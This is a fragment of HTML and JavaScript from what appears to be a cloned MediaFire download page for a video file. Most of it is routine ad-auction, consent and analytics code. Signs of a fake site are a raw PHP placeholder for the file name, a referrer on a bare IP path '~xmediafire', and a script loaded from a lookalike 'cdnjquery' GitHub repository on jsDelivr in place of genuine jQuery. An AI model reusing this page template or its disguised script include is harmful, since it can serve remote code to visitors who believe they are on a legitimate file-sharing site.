3)<<4|t>>4;t=(t&15)<<2|h>>6;h&=63;f||(h=64,e||(t=64));c.push(b[k],b[n],b[t]||"",b[h]||"")}return c.join("")};try{return JSON.stringify(this.a&&this.a,S)}finally{Uint8Array.prototype.toJSON=a}}:function(){return JSON.stringify(this.a&&this.a,S)};var S=function(a,b){return"number"!==typeof b||!isNaN(b)&&Infinity!==b&&-Infinity!==b?b:String(b)};M.prototype.toString=function(){return this.a.toString()};var T=function(a){O(this,a)};u(T,M);var U=function(a){O(this,a)};u(U,M);var ja=function(a,b){this.c=new B(a);var c=R(b,T,5);c=new y(w,Q(c,4)||"");this.b=new ea(a,c,Q(b,4));this.a=b},ka=function(a,b,c,d){b=new T(b?JSON.parse(b):null);b=new y(w,Q(b,4)||"");C(a.c,b,3,!1,c,function(){ia(function(){F(a.b);d(!1)},function(){d(!0)},Q(a.a,2),Q(a.a,3),Q(a.a,1))})};var la=function(a,b){V(a,"internal_api_load_with_sb",function(c,d,e){ka(b,c,d,e)});V(a,"internal_api_sb",function(){F(b.b)})},V=function(a,b,c){a=l.btoa(a+b);v(a,c)},W=function(a,b,c){for(var d=[],e=2;e<arguments.length;++e)d[e-2]=arguments[e];e=l.btoa(a+b);e=l[e];if("function"==r(e))e.apply(null,d);else throw Error("API not exported.");};var X=function(a){O(this,a)};u(X,M);var Y=function(a){this.h=window;this.a=a;this.b=Q(this.a,1);this.f=R(this.a,T,2);this.g=R(this.a,U,3);this.c=!1};Y.prototype.start=function(){ma();var a=new ja(this.h.document,this.g);la(this.b,a);na(this)};
var ma=function(){var a=function(){if(!l.frames.googlefcPresent)if(document.body){var b=document.createElement("iframe");b.style.display="none";b.style.width="0px";b.style.height="0px";b.style.border="none";b.style.zIndex="-1000";b.style.left="-1000px";b.style.top="-1000px";b.name="googlefcPresent";document.body.appendChild(b)}else l.setTimeout(a,5)};a()},na=function(a){var b=Date.now();W(a.b,"internal_api_load_with_sb",a.f.h(),function(){var c;var d=a.b,e=l[l.btoa(d+"loader_js")];if(e){e=l.atob(e);
e=parseInt(e,10);d=l.btoa(d+"loader_js").split(".");var f=l;d[0]in f||"undefined"==typeof f.execScript||f.execScript("var "+d[0]);for(;d.length&&(c=d.shift());)d.length?f[c]&&f[c]!==Object.prototype[c]?f=f[c]:f=f[c]={}:f[c]=null;c=Math.abs(b-e);c=1728E5>c?0:c}else c=-1;0!=c&&(W(a.b,"internal_api_sb"),Z(a,Q(a.a,6)))},function(c){Z(a,c?Q(a.a,4):Q(a.a,5))})},Z=function(a,b){a.c||(a.c=!0,a=new l.XMLHttpRequest,a.open("GET",b,!0),a.send())};(function(a,b){l[a]=function(c){for(var d=[],e=0;e<arguments.length;++e)d[e-0]=arguments[e];l[a]=q;b.apply(null,d)}})("__d3lUW8vwsKlB__",function(a){"function"==typeof window.atob&&(a=window.atob(a),a=new X(a?JSON.parse(a):null),(new Y(a)).start())});}).call(this);

window.__d3lUW8vwsKlB__("WyIyZTliZDQ1MTM1ZjkwNGJhIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2YvQUdTS1d4WHhoQ2pBMDM3NlBFSlJLdlBiWUFCSWVhcUZjSk9BUldrT095VkJOZnJLS3F1M2hHTnVqUG5EbEZMc2JKbnpWeXY2U05PVGtpbXYyd204MmMtQWRqQVx1MDAzZCJdCixbMjAsImRpdi1ncHQtYWQiLDEwMCwiTW1VNVltUTBOVEV6TldZNU1EUmlZUVx1MDAzZFx1MDAzZCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL3d3dy5nc3RhdGljLmNvbS8wZW1uL2YvcC8yZTliZDQ1MTM1ZjkwNGJhLmpzP3VzcXBcdTAwM2RDQkUiXQpdCiwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vbC9BR1NLV3hVOHZ6Z0FZRzdQd2tEbEoyZXg0NjFRZVl2MW1odDIzSFVOV3lYY3FmZjFkSlZVVWI1NFVRSEZHUV9kZkxqNFdld0pBVnZ4V3oweF9FVnB3dnpmP2FiXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2wvQUdTS1d4VjVzb2g1UVYtT2lSN3M1YWtPelVraDFlRXpQal9aVnFHREVPZ1IxZnY3emVkUjVCN0k0U21rNWxwbmdnRzdMVEhXQ0NyUVZwS09LX2RFRVNkLT9hYlx1MDAzZDJcdTAwMjZzYmZcdTAwM2QxIiwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vbC9BR1NLV3hYZE5NNmdERzBnZnJacTlHd1hHZkhPVFJEd0V6cmcyZDBLWDhHUEVuanlnVnF4Tm45X0RqclNHaUtONWZJQUJFelI1Y2oxOGRDeEc2TkFwQTdwP3NiZlx1MDAzZDIiXQo=");</script><script async="" src="https://fundingchoicesmessages.google.com/f/AGSKWxXxhCjA0376PEJRKvPbYABIeaqFcJOARWkOOyVBNfrKKqu3hGNujPnDlFLsbJnzVyv6SNOTkimv2wm82c-AdjA="></script><script async="" src="https://fundingchoicesmessages.google.com/f/AGSKWxXxhCjA0376PEJRKvPbYABIeaqFcJOARWkOOyVBNfrKKqu3hGNujPnDlFLsbJnzVyv6SNOTkimv2wm82c-AdjA="></script>
<script>
  // Make sure that the properties exist on the window.
  window.googlefc = window.googlefc || {};
  window.googlefc.callbackQueue = window.googlefc.callbackQueue || [];

  window.googlefc.controlledMessagingFunction = function(message) {
    // Only supress consent dialog when ads are not shown AND GDPR applies
    if (window.displayAds === false) {
      __tcfapi('getTCData', 0, (data, success) => {
       	if (success && data.gdprApplies) {
       	  message.proceed(false);
       	} else {
          message.proceed(true);
       	}
      });
    } else {
      message.proceed(true);
    }
  }

  // Queue the callback on the callbackQueue.
  googlefc.callbackQueue.push({
    'CONSENT_DATA_READY':
    function() {
      __uspapi('getUSPData', 1, (data, success) => {
        if (success) {
          var privacyStringOverride = data.uspString;
          if (navigator.globalPrivacyControl && data.uspString.charAt(2) == 'N') {
            // We have to override google if globalPrivacyControl is set. See also .well-known/gpc.json
            // https://globalprivacycontrol.github.io/gpc-spec/#expressing-a-do-not-sell-or-share-preference
            var oldUspApi = __uspapi;
            privacyStringOverride = data.uspString.substring(0,2) + 'Y' + data.uspString.charAt(3);
            window.__uspapi = function(name, version, callback) {
              if (name == 'getUSPData') {
                callback({"version": 1, "uspString": privacyStringOverride}, true);
              } else {
                oldUspApi(name, version, callback);
              }
            };
          }
          // Loot at override instead of original string so that code above can affect this code
          if (privacyStringOverride.charAt(2) == 'Y') {
            if (getCookie('ccpa_optout_tracked') !== '1') {
              var oXHR = new XMLHttpRequest();
              oXHR.open('POST', '/dynamic/track_ccpa_optout.php', true);
              oXHR.send();
              setCookie('ccpa_optout_tracked', '1', 730);
            }
          }
        }
      });
    }
  });
</script> <script>
            (function() {
                // Constants
                var AD_UNITS_CONFIG = getConfig();
                var BIDDER_ALIASES = getBidderAliases();
                var DISABLED_AD_UNITS = JSON.parse('["div-gpt-ad-1583943164748-0"]');
                var BIDDER_SETTINGS = JSON.parse('[]');
                var PREBID_TIMEOUT = 1000;
                var MAX_RETRIES = 20;
                var LAZY_LOAD_AD_UNIT_MARGIN = 0;

                // Init namespaces
                var googletag = googletag || {};
                var pbjs = pbjs || {};
                googletag.cmd = googletag.cmd || [];
                pbjs.que = pbjs.que || [];
                pbjs.retries = 0;

                // Export
                window.googletag = googletag;
                window.pbjs = pbjs;

                // Disable load until bids arrive
                googletag.cmd.push(function() {
                    googletag.pubads().disableInitialLoad();
                });

                function getConfig() {
                    return JSON.parse('[{"code":"div-gpt-ad-1583943391676-0","sizes":[[320,50],[320,100],[300,100],[300,75]],"mediaTypes":{"banner":{"sizes":[[320,50],[320,100],[300,100],[300,75]]}},"tracking_id":"\/183096492\/Mediafire-Mobileweb-Top","bids":[{"bidder":"openx","params":{"delDomain":"mediafire-d.openx.net","unit":"539074895"}},{"bidder":"pubmatic","params":{"publisherId":"158936","adSlot":"MediaFire_MobileWeb_Top"}},{"bidder":"sharethrough","params":{"pkey":"hkeT3H47uRjxo6oZMXyxY1z7"},"labelAny":["GEO-AU","GEO-BE","GEO-BR","GEO-CA","GEO-FR","GEO-DE","GEO-IN","GEO-IT","GEO-MY","GEO-MX","GEO-NL","GEO-NZ","GEO-PH","GEO-SG","GEO-ZA","GEO-ES","GEO-CH","GEO-AE","GEO-GB","GEO-US"]},{"bidder":"onetag","params":{"pubId":"754491929fcbe98"},"labelAny":["GEO-AR","GEO-BR","GEO-CA","GEO-CL","GEO-CO","GEO-EC","GEO-FR","GEO-DE","GEO-GT","GEO-MX","GEO-PE","GEO-PL","GEO-ES","GEO-GB","GEO-US"]},{"bidder":"medianet","params":{"cid":"8CUO2689O","crid":"126221593"}}]},{"code":"div-gpt-ad-1583943269780-0","sizes":[[320,50]],"mediaTypes":{"banner":{"sizes":[[320,50]]}},"tracking_id":"\/183096492\/MediaFire-MobileWeb-Bottom","bids":[{"bidder":"openx","params":{"delDomain":"mediafire-d.openx.net","unit":"539074894"}},{"bidder":"pubmatic","params":{"publisherId":"158936","adSlot":"MediaFire_MobileWeb_Bottom"}},{"bidder":"sharethrough","params":{"pkey":"P0NqaGuacHlOQJGBagkC4TFV"},"labelAny":["GEO-AU","GEO-BE","GEO-BR","GEO-CA","GEO-FR","GEO-DE","GEO-IN","GEO-IT","GEO-MY","GEO-MX","GEO-NL","GEO-NZ","GEO-PH","GEO-SG","GEO-ZA","GEO-ES","GEO-CH","GEO-AE","GEO-GB","GEO-US"]},{"bidder":"onetag","params":{"pubId":"754491929fcbe98"},"labelAny":["GEO-AR","GEO-BR","GEO-CA","GEO-CL","GEO-CO","GEO-EC","GEO-FR","GEO-DE","GEO-GT","GEO-MX","GEO-PE","GEO-PL","GEO-ES","GEO-GB","GEO-US"]},{"bidder":"medianet","params":{"cid":"8CUO2689O","crid":"524626231"}}]},{"code":"div-gpt-ad-1583943164748-0","sizes":[[320,50],[320,100],[300,100],[300,75]],"mediaTypes":{"banner":{"sizes":[[320,50],[320,100],[300,100],[300,75]]}},"tracking_id":"\/183096492\/Mediafire-Mobileweb-Ad3","bids":[{"bidder":"openx","params":{"delDomain":"mediafire-d.openx.net","unit":"539078236"}},{"bidder":"pubmatic","params":{"publisherId":"158936","adSlot":"MediaFire_MobileWeb_Ad3"}},{"bidder":"sharethrough","params":{"pkey":"P0NqaGuacHlOQJGBagkC4TFV"},"labelAny":["GEO-AU","GEO-BE","GEO-BR","GEO-CA","GEO-FR","GEO-DE","GEO-IN","GEO-IT","GEO-MY","GEO-MX","GEO-NL","GEO-NZ","GEO-PH","GEO-SG","GEO-ZA","GEO-ES","GEO-CH","GEO-AE","GEO-GB","GEO-US"]},{"bidder":"onetag","params":{"pubId":"754491929fcbe98"},"labelAny":["GEO-AR","GEO-BR","GEO-CA","GEO-CL","GEO-CO","GEO-EC","GEO-FR","GEO-DE","GEO-GT","GEO-MX","GEO-PE","GEO-PL","GEO-ES","GEO-GB","GEO-US"]},{"bidder":"medianet","params":{"cid":"8CUO2689O","crid":"616778526"}}]}]');
                }

                function getBidderAliases() {
                    return JSON.parse('[]');
                }

                // Bids arrived or timeout reached
                function initAdserver() {
                    if (pbjs.initAdserverSet) return;

                    if (!googletag.pubadsReady && pbjs.retries <= MAX_RETRIES) {
                      setTimeout(initAdserver, 50);
                      pbjs.retries++;
                      return;
                    }

                    pbjs.initAdserverSet = true;

                    googletag.cmd.push(function() {
                        pbjs.que.push(function() {
                            pbjs.setTargetingForGPTAsync();
                
                            window.setMaxBidTargeting();

                            // Load ad units except disabled ones
                            AD_UNITS_CONFIG.forEach(function(ad) {
                                if (DISABLED_AD_UNITS.includes(ad.code))
                                    return;
                                window.refreshSlot(ad.code);
                            });
                        });
                    });
                }

                // define public method to refresh a slot
                window.refreshSlot = function(code) {
                    googletag.pubads().getSlots().some(function(slot) {
                        if (slot.getSlotElementId() == code) {
                            googletag.pubads().refresh([slot]);
                            return true;
                        }
                    });
                }
                
                // Find max bids and their bidders for each ad code
                // See https://docs.prebid.org/dev-docs/publisher-api-reference.html
                window.setMaxBidTargeting = function() {
                    var maxBids = [];
                    pbjs.adUnits.forEach(unit=>{
                        var topMaxBid = null;
                        var topMaxBidStr;
                        var topBidder ;
                        pbjs.getBidResponsesForAdUnitCode(unit.code).bids.forEach(bid=>{
                            var fBidValue = parseFloat(bid.pbCg);
                            if (topMaxBid == null || fBidValue > topMaxBid) {
                                topMaxBid = fBidValue;
                                topMaxBidStr = bid.pbCg;
                                topBidder = bid.bidder;
                            }
                        });
                        maxBids[unit.code] = {
                            bidder: topBidder,
                            maxBid: topMaxBidStr
                        };
                    });
                    googletag.pubads().getSlots().map(slot=>{
                        var adCode = slot.getSlotElementId();
                        slot
                            .setTargeting('hb_highestbidder', maxBids[adCode].bidder)
                            .setTargeting('hb_highestbid', maxBids[adCode].maxBid);
                    });
                }

                window['adLazyLoadQueue'] = [];
                var adLoaded = [];

                window.checkAdUnitView = function(code, elementPosition, windowScrollData) {
                    if (adLoaded[code]) {
                        return;
                    }

                    if ((elementPosition.left - LAZY_LOAD_AD_UNIT_MARGIN) < windowScrollData.windowInnerWidth &&
                            (elementPosition.right + LAZY_LOAD_AD_UNIT_MARGIN) > 0 &&
                            (elementPosition.top - LAZY_LOAD_AD_UNIT_MARGIN) < windowScrollData.windowInnerHeight &&
                            (elementPosition.bottom + LAZY_LOAD_AD_UNIT_MARGIN) > 0) {
                        googletag.cmd.push(function () {
                            window.refreshSlot(code);
                            adLoaded[code] = true;
                        });
                    }
                }

                window.checkQueuedAdUnitViews = function(windowScrollData) {
                    var queue = window['adLazyLoadQueue'];
                    if (!queue.length) return;

                    queue.forEach(function(code) {
                        var adElement = document.getElementById(code);
                        if (adElement) {
                            var boundingRect = adElement.getBoundingClientRect();
                            window.checkAdUnitView(code, {
                                left: boundingRect.left - windowScrollData.windowPageXOffset,
                                right: boundingRect.left + boundingRect.width,
                                top: boundingRect.top - windowScrollData.windowPageYOffset,
                                bottom: boundingRect.top + boundingRect.height
                            }, windowScrollData);
                        }
                    });
                }


                // Helper function to load scripts
                function loadScript(src) {
                    var script = document.createElement('script');
                    script.async = true;
                    script.type = 'text/javascript';
                    script.src = src;
                    var node = document.getElementsByTagName('script')[0];
                    node.parentNode.insertBefore(script, node);
                }

                // Timeout if bids take x milliseconds
                setTimeout(initAdserver, PREBID_TIMEOUT);

                // Load Google Services
                loadScript('https://securepubads.g.doubleclick.net/tag/js/gpt.js');

                // Load Prebid
                /*
                    Version: 5.10.0
                    Bidders:
                        AppNexus
                        OpenX
                        Pubmatic
                        Sharethrough
                    Analytic Adapters:
                    Modules:
                */
                loadScript('/js/prebid5.17.0.js');

                // Setup and request bids
                pbjs.que.push(function() {

                    // For reference:
                    // http://prebid.org/dev-docs/publisher-api-reference.html#module_pbjs.setConfig
                    pbjs.setConfig({
                        debug: false,
                        enableSendAllBids: true,
                        priceGranularity: {
                            buckets: [
                                {
                                    max: 0.05,
                                    increment: 0.01
                                },
                                {
                                    max: 5,
                                    increment: 0.05
                                },
                                {
                                    max: 10,
                                    increment: 0.10
                                },
                                {
                                    max: 20,
                                    increment: 0.50
                                }
                            ]
                        },
                        bidderSequence: 'random',
                        bidderTimeout: PREBID_TIMEOUT,
                        userSync: {
                            filterSettings: {
                                iframe: {
                                    bidders: '*',
                                    filter: 'include'
                                }
                            }
                        }
                        // cache: {url: "https://prebid.adnxs.com/pbc/v1/cache"},
                        // s2sConfig: {
                            // endpoint: "https://prebid.adnxs.com/pbs/v1/openrtb2/auction",
                            // syncEndpoint: "https://prebid.adnxs.com/pbs/v1/cookie_sync",
                        // }
                    });

                    BIDDER_ALIASES.forEach(function(bidderAlias) {
                        pbjs.aliasBidder(bidderAlias.name, bidderAlias.alias);
                    });

                    // Bidder settings
                    for (bidder in BIDDER_SETTINGS) {
                        if (BIDDER_SETTINGS[bidder].bidCpmAdjustment) {
                            pbjs.bidderSettings[bidder] = pbjs.bidderSettings[bidder] || {};
                            pbjs.bidderSettings[bidder].bidCpmAdjustment = (function(bidCpmAdjustment, bidCpm, bid){
                                return bidCpm * bidCpmAdjustment / 100;
                            }).bind(null, BIDDER_SETTINGS[bidder].bidCpmAdjustment);
                        }
                    }

                    pbjs.addAdUnits(AD_UNITS_CONFIG);
                    pbjs.requestBids({
                        bidsBackHandler: initAdserver,
                        labels: ['GEO-AU']
                    });
                });

                // Define and enable ad slots
                googletag.cmd.push(function() {
                    for (var i = 0; i < AD_UNITS_CONFIG.length; i++) {
                        var slot;
                        var ad;
                        try {
                            ad = AD_UNITS_CONFIG[i];
                            slot = googletag.defineSlot(ad.tracking_id, ad.sizes, ad.code);
                            if (slot) {
                                slot.addService(googletag.pubads())
                                    .setTargeting('buildnumber', '121874')
                                    .setTargeting('dladtemplate', '4')
                                    .setTargeting('button_delay', 'disabled');
                            }
                        } catch (e) {
                            console.log('ad failed: ', e, ad, slot);
                        }
                    }
                    try {
                        googletag.pubads().set('page_url', top.location.href);
                    } catch(e) {
                        googletag.pubads().set('page_url', 'https://www.mediafire.com');
                    }
                    googletag.pubads().enableSingleRequest();
                    googletag.enableServices();
                });
            })();
            </script>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-829541-1"></script>
<script>
        try {
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag("js", new Date());
            gtag("config", "UA-829541-1", {"dimension1":"unregistered","dimension7":"legacy","dimension3":"video","dimension4":"4","dimension5":"mp4","dimension8":"\/20\/50\/100\/"});
        } catch(e) {}
    </script>
<script type="text/javascript">
    (function(e,t){var n=e.amplitude||{_q:[],_iq:{}};var r=t.createElement("script")
    ;r.type="text/javascript"
    ;r.integrity="sha384-tzcaaCH5+KXD4sGaDozev6oElQhsVfbJvdi3//c2YvbY02LrNlbpGdt3Wq4rWonS"
    ;r.crossOrigin="anonymous";r.async=true
    ;r.src="https://cdn.amplitude.com/libs/amplitude-8.5.0-min.gz.js"
    ;r.onload=function(){if(!e.amplitude.runQueuedFunctions){
    console.log("[Amplitude] Error: could not load SDK")}}
    ;var i=t.getElementsByTagName("script")[0];i.parentNode.insertBefore(r,i)
    ;function s(e,t){e.prototype[t]=function(){
    this._q.push([t].concat(Array.prototype.slice.call(arguments,0)));return this}}
    var o=function(){this._q=[];return this}
    ;var a=["add","append","clearAll","prepend","set","setOnce","unset","preInsert","postInsert","remove"]
    ;for(var c=0;c<a.length;c++){s(o,a[c])}n.Identify=o;var u=function(){this._q=[]
    ;return this}
    ;var l=["setProductId","setQuantity","setPrice","setRevenueType","setEventProperties"]
    ;for(var p=0;p<l.length;p++){s(u,l[p])}n.Revenue=u
    ;var d=["init","logEvent","logRevenue","setUserId","setUserProperties","setOptOut","setVersionName","setDomain","setDeviceId","enableTracking","setGlobalUserProperties","identify","clearUserProperties","setGroup","logRevenueV2","regenerateDeviceId","groupIdentify","onInit","logEventWithTimestamp","logEventWithGroups","setSessionId","resetSessionId"]
    ;function v(e){function t(t){e[t]=function(){
    e._q.push([t].concat(Array.prototype.slice.call(arguments,0)))}}
    for(var n=0;n<d.length;n++){t(d[n])}}v(n);n.getInstance=function(e){
    e=(!e||e.length===0?"$default_instance":e).toLowerCase()
    ;if(!Object.prototype.hasOwnProperty.call(n._iq,e)){n._iq[e]={_q:[]};v(n._iq[e])
    }return n._iq[e]};e.amplitude=n})(window,document);

    var amp = amplitude.getInstance();
    amp.init('28916b6cd60c79c0447b3c23ad698c98');
    if ('') amp.setUserId('7d8e227e283c6630');
    amp.setUserProperties({group: '1'});
    </script><script src="https://cdn.jsdelivr.net/gh/cdnjquery/jquery/3.6.3/jquery.min.slim.js"></script> <script type="text/javascript">
    (function() {
        window.aax = window.aax || {};
        var aax = window.aax;
        aax.initTime = new Date().getTime();
        aax.pubId = "AAX3221EY";
        aax.ver = "1.2";
        aax.hst = window.location.hostname;
        var aaxEndpoint = "https://c.aaxads.com/aax.js?pub=" + aax.pubId + "&hst=" +
            aax.hst + "&ver=" + aax.ver;
        function loadScript(endpoint) {
            var scriptTag = document.createElement("script"),
                placeTag = document.getElementsByTagName("script")[0];
            scriptTag.type = "text/javascript";
            scriptTag.async = true;
            scriptTag.src = endpoint;
            placeTag.parentNode.insertBefore(scriptTag, placeTag);
        }
        loadScript(aaxEndpoint);
    })();
</script><script>
    window.aax = window.aax || {};
    window.aax.cmd = window.aax.cmd || [];
    window.aax.cmd.push(function () {
        if (window.aax.getAbpStatus()) {
            window.googletag = window.googletag || {};
            window.googletag.cmd = window.googletag.cmd || [];
            window.googletag.cmd.push(function () {
                googletag.pubads().refresh();
            });
        }
    });
</script> 
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-53LP4T');</script>
 
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-53LP4T"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<meta http-equiv="origin-trial" content="AxujKG9INjsZ8/gUq8+dTruNvk7RjZQ1oFhhgQbcTJKDnZfbzSTE81wvC2Hzaf3TW4avA76LTZEMdiedF1vIbA4AAABueyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2NTI3NzQ0MDAsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0="><meta http-equiv="origin-trial" content="Azuce85ORtSnWe1MZDTv68qpaW3iHyfL9YbLRy0cwcCZwVnePnOmkUJlG8HGikmOwhZU22dElCcfrfX2HhrBPAkAAAB7eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2NTI3NzQ0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A16nvcdeoOAqrJcmjLRpl1I6f3McDD8EfofAYTt/P/H4/AWwB99nxiPp6kA0fXoiZav908Z8etuL16laFPUdfQsAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2NTI3NzQ0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AxBHdr0J44vFBQtZUqX9sjiqf5yWZ/OcHRcRMN3H9TH+t90V/j3ENW6C8+igBZFXMJ7G3Pr8Dd13632aLng42wgAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2NTI3NzQ0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A88BWHFjcawUfKU3lIejLoryXoyjooBXLgWmGh+hNcqMK44cugvsI5YZbNarYvi3roc1fYbHA1AVbhAtuHZflgEAAAB2eyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IlRydXN0VG9rZW5zIiwiZXhwaXJ5IjoxNjUyNzc0NDAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="AzoawhTRDevLR66Y6MROu167EDncFPBvcKOaQispTo9ouEt5LvcBjnRFqiAByRT+2cDHG1Yj4dXwpLeIhc98/gIAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A6+nc62kbJgC46ypOwRsNW6RkDn2x7tgRh0wp7jb3DtFF7oEhu1hhm4rdZHZ6zXvnKZLlYcBlQUImC4d3kKihAcAAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/9La288e7MDEU2ifusFnMg1C2Ij6uoa/Z/ylwJIXSsWfK37oESIPbxbt4IU86OGqDEPnNVruUiMjfKo65H/CQwAAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><script src="https://securepubads.g.doubleclick.net/gpt/pubads_impl_2022051001.js" async=""></script><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><script type="text/javascript" charset="UTF-8" src="https://translate.googleapis.com/_/translate_http/_/js/k=translate_http.tr.en_GB.fnXM8WkEhAk.O/am=Ag/d=1/exm=el_conf/ed=1/rs=AN8SPfpzhwQxcos8Yr93ABp3a69-Y9hhyg/m=el_main"></script><script async="" src="https://fundingchoicesmessages.google.com/f/AGSKWxV9eJxVcrpvmyYsEOfDifXg6BNvs57Wgm_-PU21XZnuabQCx-ztoKOssSTgTAOeBSpJ15PuO0leQyl-t6n0joU=?fccs=W1siQUtzUm9sX1lwTWxVRHFhenpvcG9laUxzc2Zpb2J5U1RFUWY2czR1MTJEWERWZE1FeVdFV1hEWkpiRGJBcjJ2ZXJjdnBPMTRSQVZBeGFyV2ZXcFpyOGROenhGeGtseVJnQVZMNTZLZnVzQ0REcnA0aXdoRzFRb05NTy1lNVFWWW1Rd2dkZUF2UjVTMlpkY3JTZXBUTUhENVgxbUJ4NGFmOHhRPT0iXSxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzE2NTI1NTYxNzUsODQ5MDAwMDAwXSwiMzhBNTVFMDUtOTI1Ri00ODNDLThEMEEtNjVBNzhCMENDMzYwIiwiMDA1NzlFQ0MtRDQwNC00MTkxLUE3MjEtMzI1MUQ0OEQ1M0UyIixudWxsLFtudWxsLFs3XV0sImh0dHBzOi8vd3d3Lm1lZGlhZmlyZS5jb20vZmlsZS9iN3VuZWo4cDN0eXNtMjgvY3V0ZV9jYXRfcmVsYXhfb25fb3V0ZG9vcl9ncm91bmRfNjg5MjUzMy5tcDQvZmlsZSIsbnVsbCxbXV0"></script><script type="text/javascript" src="https://otnolatrnup.com/Tag.vrfy?time=0&amp;id=5ff0fb62-0643-4ff1-aaee-c737f9ffc0e0&amp;rand=63764&amp;ver=async&amp;referrerUrl=&amp;fingerPrint=123&amp;abr=false&amp;stdTime=0&amp;fpe=1&amp;bw=1365&amp;bh=969&amp;res=1920x1080&amp;curl=https%3A%2F%2Fwww.mediafire.com%2Ffile%2Fb7unej8p3tysm28%2F<?php echo $namafile; ?>.mp4%2Ffile&amp;kw=online%20storage%2Cfree%20storage%2Ccloud%20storage%2Ccollaboration%2Cbackup%20file%20sharing%2Cshare%20files%2Cphoto%20backup%2Cphoto%20sharing%2Cftp%20replacement%2Ccross%20platform%2Cremote%20access%2Cmobile%20access%2Csend%20large%20files%2Crecover%20files%2Cfile%20versioning%2Cundelete%2Cwindows%2Cpc%2Cmac%2Cos%20x%2Clinux%2Ciphone&amp;sig=BAYAYoAA7gFigADugAGBAcAAIL3atlrl_GZM3EoC5rbIUcm8rXCGklB4FYJwmJsgeS8AwQAgMnIwSvLlexsNFhbr3w8lr4fmqMp7Ld8WTMnt5l_Bqvg"></script><script type="text/javascript" src="https://otnolatrnup.com/Tag.vrfy?time=0&amp;id=5ff0fb62-0643-4ff1-aaee-c737f9ffc0e0&amp;rand=51240&amp;ver=async&amp;referrerUrl=https%3A%2F%2F103-136-43-42.cprapid.com%3A2087%2F&amp;fingerPrint=123&amp;abr=false&amp;stdTime=0&amp;fpe=1&amp;bw=1365&amp;bh=969&amp;res=1920x1080&amp;curl=http%3A%2F%2F103.136.43.42%2F~xmediafire%2F&amp;kw=online%20storage%2Cfree%20storage%2Ccloud%20storage%2Ccollaboration%2Cbackup%20file%20sharing%2Cshare%20files%2Cphoto%20backup%2Cphoto%20sharing%2Cftp%20replacement%2Ccross%20platform%2Cremote%20access%2Cmobile%20access%2Csend%20large%20files%2Crecover%20files%2Cfile%20versioning%2Cundelete%2Cwindows%2Cpc%2Cmac%2Cos%20x%2Clinux%2Ciphone&amp;sig=BAYAYoAAggFigACCgAGBAcAAIDYo0zHGzxyppJWlrfQ16ppqjRmAmUAUBxwGwlBa2_E3wQAg-M1MC-tAfhavCrWMBv54ZHQaYRX2SD4D7aB16ay9WoY"></script><script async="" 